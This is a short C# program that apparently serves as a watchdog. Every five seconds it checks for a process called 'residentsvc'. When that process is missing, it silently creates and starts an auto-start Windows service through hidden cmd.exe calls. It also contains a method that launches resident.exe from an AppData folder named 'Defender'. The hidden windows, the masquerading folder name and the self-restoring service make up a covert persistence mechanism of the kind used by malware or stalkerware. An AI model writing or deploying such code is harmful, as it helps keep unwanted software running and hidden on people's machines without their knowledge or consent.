using System;
using System.Diagnostics;
using System.Threading;

namespace screen
{
	class Program
	{
		static void Main( string[] args )
		{
			while ( true )
			{
				if ( Process.GetProcessesByName( "residentsvc" ).Length == 0 )
					handleSvc( );

				Thread.Sleep( 5000 );
			}
		}

		static void handleExe( )
		{
			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.WorkingDirectory = $"{Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Defender";
			startInfo.Arguments = $"/C start {Environment.GetFolderPath( Environment.SpecialFolder.ApplicationData )}\\Defender\\resident.exe";
			Process.Start( startInfo );
		}
		static void handleSvc( )
		{
			var myPath = AppDomain.CurrentDomain.BaseDirectory;
			var residentPath = myPath.Replace( "Screen", "Defender" );

			var startInfo = new ProcessStartInfo( );
			startInfo.CreateNoWindow = true;
			startInfo.WindowStyle = ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";

			startInfo.Arguments = $"/C sc create residentsvc binPath= {residentPath}residentsvc.exe start= auto";
			Process.Start( startInfo );

			startInfo.Arguments = $"/C sc start residentsvc";
			Process.Start( startInfo );
		}
	}
}
